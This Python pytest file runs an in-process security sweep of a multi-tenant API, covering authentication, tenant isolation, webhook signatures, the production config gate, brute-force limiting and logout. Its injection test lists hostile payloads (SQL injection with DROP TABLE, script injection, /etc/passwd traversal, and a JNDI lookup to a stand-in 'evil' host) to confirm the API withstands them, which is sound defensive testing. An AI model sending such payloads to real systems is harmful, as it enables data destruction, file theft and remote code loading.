"""Security campaign — internal adversarial sweep of the auth/tenancy surface.

This is the automated layer of the security push: an attacker-shaped pass
over authentication, tenant isolation, injection resistance, webhook
signature enforcement, the production boot gate and the brute-force limiter.
It complements (does not replace) an external penetration test — see
docs/security-campaign.md for scope honesty.

Everything runs in-process against the real app with REAL session tokens and
REAL middleware; no security control is mocked or bypassed.
"""

from __future__ import annotations

import pytest
from httpx import ASGITransport, AsyncClient
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker
from sqlalchemy.pool import StaticPool

import db.models  # noqa: F401 — register all tables
from api.dependencies import get_db_session
from api.main import create_app
from db.connection.session import Base

STRONG_PW = "campaign-pw-Str0ng!"


def _make_app():
    import os

    os.environ.setdefault("ENVIRONMENT", "test")
    os.environ.setdefault("SECRET_KEY", "test-secret-key-for-sessions-min-32-chars")
    from api.config.settings import get_settings

    get_settings.cache_clear()
    engine = create_engine("sqlite:///:memory:", connect_args={"check_same_thread": False},
                           poolclass=StaticPool)
    Base.metadata.create_all(engine)
    session = sessionmaker(bind=engine, expire_on_commit=False)()
    app = create_app()
    app.dependency_overrides[get_db_session] = lambda: (yield session)
    return app, session, engine


def _act_as(client, session, username: str, roles: str = "readonly"):
    from api.security.session_manager import SessionManager
    from db.repositories.user_repository import UserRepository

    if UserRepository(session).get_by_username(username) is None:
        UserRepository(session).create_user(username, "x", roles=[roles])
        session.commit()
    token = SessionManager().create_session(username, roles=[roles])
    client.headers["Authorization"] = f"Bearer {token}"


async def _signup(client, org, username, password=STRONG_PW):
    return await client.post("/api/v1/saas/signup", json={
        "org_name": org, "username": username, "password": password,
        "email": f"{username}@example.io"})


PROTECTED_PATHS = [
    "/api/v1/monitor/targets",
    "/api/v1/systems",
    "/api/v1/findings",
    "/api/v1/saas/usage",
    "/api/v1/attacks",
    "/api/v1/priority",
    "/api/v1/cbom/live/whatever",
    "/api/v1/api-keys",
    "/api/v1/evidence/packs",
]


@pytest.mark.asyncio
async def test_no_unauthenticated_access_to_sensitive_surface():
    """Every sensitive path must refuse anonymous callers (401/403), never
    leak data (200) or crash (5xx)."""
    app, session, engine = _make_app()
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        leaks, crashes = [], []
        for path in PROTECTED_PATHS:
            r = await client.get(path)
            if r.status_code in (200, 201):
                leaks.append(path)
            elif r.status_code >= 500:
                crashes.append((path, r.status_code))
        assert leaks == [], f"unauthenticated data leak: {leaks}"
        assert crashes == [], f"5xx on anonymous probes: {crashes}"


@pytest.mark.asyncio
async def test_cross_tenant_access_is_absent_not_forbidden():
    """Tenant B must not learn tenant A's target exists: 404, no echo."""
    app, session, engine = _make_app()
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        a = (await _signup(client, "AlphaSec", "alice")).json()["tenant"]["id"]
        b = (await _signup(client, "BetaSec", "bob")).json()["tenant"]["id"]

        _act_as(client, session, "alice")
        target = (await client.post("/api/v1/monitor/targets",
                                    headers={"X-Tenant-ID": a},
                                    json={"name": "alpha-secret-edge",
                                          "target_type": "NETWORK",
                                          "config": {"endpoints": ["a.example.io:443"]}})).json()

        _act_as(client, session, "bob")
        # bob's listing does not contain alpha's target (absence, not 403)
        listed = (await client.get("/api/v1/monitor/targets",
                                   headers={"X-Tenant-ID": b})).text
        assert "alpha-secret-edge" not in listed and target["id"] not in listed
        # a forged tenant header must not promote another tenant's data
        r2 = await client.get("/api/v1/monitor/targets",
                              headers={"X-Tenant-ID": a})
        assert r2.status_code in (403, 404) or "alpha-secret-edge" not in r2.text


@pytest.mark.asyncio
async def test_injection_sweep_never_produces_5xx():
    """SQLi / XSS / traversal payloads through filters, search and path
    params must land in validation/empty results — never a server error,
    and the store must survive intact."""
    app, session, engine = _make_app()
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        _act_as(client, session, "sweep-readonly")
        payloads = [
            "' OR 1=1 --", "'; DROP TABLE systems;--", "1' UNION SELECT 1,2,3--",
            "<script>alert(1)</script>", "../../etc/passwd", "%2e%2e%2f%2e%2e",
            "{{7*7}}", "${jndi:ldap://evil/x}", "%00%27null",
        ]
        probes = [
            ("GET", "/api/v1/findings", {"search": None}),
            ("GET", "/api/v1/systems", {"search": None}),
            ("GET", "/api/v1/monitor/targets", {"name": None}),
            ("GET", "/api/v1/drift", {"severity": None}),
        ]
        crashes = []
        for method, path, params in probes:
            for payload in payloads:
                q = {k: payload for k, v in params.items() if v is None}
                r = await client.request(method, path, params=q)
                if r.status_code >= 500:
                    crashes.append((path, payload, r.status_code))
            # path-param variant
            r = await client.get(f"/api/v1/findings/{payload}")
            if r.status_code >= 500:
                crashes.append((path, payload, r.status_code))
        assert crashes == [], f"injection probes caused 5xx: {crashes}"
        # store still functional after the DROP-TABLE attempt
        r = await client.get("/api/v1/systems")
        assert r.status_code == 200


@pytest.mark.asyncio
async def test_webhook_signature_enforcement():
    """Both webhook families refuse unsigned/forged deliveries."""
    import hashlib
    import hmac as hmac_mod

    app, session, engine = _make_app()
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        body = json_dumps({"action": "opened", "zen": "x"})
        # unsigned
        r = await client.post("/api/v1/webhooks/github", content=body,
                              headers={"Content-Type": "application/json",
                                       "X-GitHub-Event": "ping"})
        assert r.status_code in (400, 401, 403, 422)
        # forged signature
        forged = "sha256=" + "0" * 64
        r2 = await client.post("/api/v1/webhooks/github", content=body,
                               headers={"Content-Type": "application/json",
                                        "X-GitHub-Event": "ping",
                                        "X-Hub-Signature-256": forged})
        assert r2.status_code in (400, 401, 403, 422)
        # correct signature accepted (200/202-family) or cleanly validation-refused
        secret = "burn-webhook-secret-0123456789ab"
        import os
        os.environ["GITHUB_WEBHOOK_SECRET"] = secret
        try:
            good = "sha256=" + hmac_mod.new(secret.encode(), body.encode(),
                                            hashlib.sha256).hexdigest()
            r3 = await client.post("/api/v1/webhooks/github", content=body,
                                   headers={"Content-Type": "application/json",
                                            "X-GitHub-Event": "ping",
                                            "X-Hub-Signature-256": good})
            assert r3.status_code < 500
        finally:
            os.environ.pop("GITHUB_WEBHOOK_SECRET", None)
        # Stripe webhook: unsigned/missigned -> 400 (never 5xx)
        r4 = await client.post("/api/v1/saas/billing/webhook", content=body,
                               headers={"Content-Type": "application/json"})
        assert r4.status_code == 400
        r5 = await client.post("/api/v1/saas/billing/webhook", content=body,
                               headers={"Content-Type": "application/json",
                                        "Stripe-Signature": "t=1,v1=deadbeef"})
        assert r5.status_code == 400


def test_production_boot_gate_fails_closed():
    """ENVIRONMENT=production with demo defaults must refuse to validate."""
    from api.config.settings import APISettings, validate_runtime_settings

    base = {"ENVIRONMENT": "production", "SECRET_KEY": "a" * 32,
            "ADMIN_PASSWORD_HASH": "x" * 60,
            "METRICS_TOKEN": "m" * 32,
            "ALERTMANAGER_WEBHOOK_TOKEN": "a" * 32,
            "CORS_ORIGINS": "https://app.example.com",
            "TRUSTED_HOSTS": ["app.example.com"],
            "REDIS_URL": "rediss://ci_acl_user:ci-only-redis-password@redis.example.invalid:6379/0",
            "DATABASE_URL": "postgresql://ci:ci@db.example.invalid:5432/ci",
            "GITHUB_WEBHOOK_SECRET": "w" * 32,
            "REGISTRY_WEBHOOK_SECRET": "r" * 32,
            "CBOM_SIGNING_SECRET": "c" * 32,
            "STREAM_SECRET": "s" * 32,
            "AUDITOR_API_KEY": "a" * 32,
            "NEO4J_URI": "bolt://neo4j:7687",
            "NEO4J_PASSWORD": "n" * 24}
    # strong config validates
    validate_runtime_settings(APISettings(**base))
    # weak/duplicate-listed secret refused
    weak = dict(base, SECRET_KEY="dev-cryptoscan-secret-key-change-in-production-32")
    with pytest.raises(Exception):
        validate_runtime_settings(APISettings(**weak))
    # short secret refused
    with pytest.raises(Exception):
        validate_runtime_settings(APISettings(**dict(base, SECRET_KEY="short")))
    # weak admin password WITHOUT hash refused (hash must be absent, not just present)
    no_hash = {k: v for k, v in base.items() if k != "ADMIN_PASSWORD_HASH"}
    with pytest.raises(Exception):
        validate_runtime_settings(APISettings(**no_hash, ADMIN_PASSWORD="cryptoscan"))


@pytest.mark.asyncio
async def test_login_bruteforce_limiter_blocks_the_sixth_attempt(monkeypatch):
    """5 logins/min per source IP — attempt #6 within the window is 429.

    The limiter middleware is (by design) not installed under ENVIRONMENT=test,
    so this probe builds the app in development mode — production defaults,
    real middleware, no bypass."""
    monkeypatch.setenv("ENVIRONMENT", "development")
    monkeypatch.setenv("SECRET_KEY", "campaign-dev-secret-key-0123456789ab")
    monkeypatch.setenv("RATE_LIMIT_DISABLED", "")
    from api.config.settings import get_settings

    get_settings.cache_clear()
    engine = create_engine("sqlite:///:memory:", connect_args={"check_same_thread": False},
                           poolclass=StaticPool)
    Base.metadata.create_all(engine)
    session = sessionmaker(bind=engine, expire_on_commit=False)()
    app = create_app()
    app.dependency_overrides[get_db_session] = lambda: (yield session)
    try:
        transport = ASGITransport(app=app)
        async with AsyncClient(transport=transport, base_url="http://test") as client:
            codes = []
            for _ in range(6):
                r = await client.post("/api/v1/auth/login",
                                      json={"username": "ghost", "password": "wrong-pw-123"})
                codes.append(r.status_code)
            assert codes[:5] == [401] * 5
            assert codes[5] == 429, f"expected brute-force lockout, got {codes}"
    finally:
        get_settings.cache_clear()


@pytest.mark.asyncio
async def test_logout_invalidates_the_session():
    app, session, engine = _make_app()
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        _act_as(client, session, "logout-probe", roles="readonly")
        assert (await client.get("/api/v1/auth/me")).status_code == 200
        r = await client.post("/api/v1/auth/logout")
        assert r.status_code in (200, 204)
        client.headers.pop("Authorization", None)
        assert (await client.get("/api/v1/auth/me")).status_code in (401, 403)


def json_dumps(payload: dict) -> str:
    import json

    return json.dumps(payload)
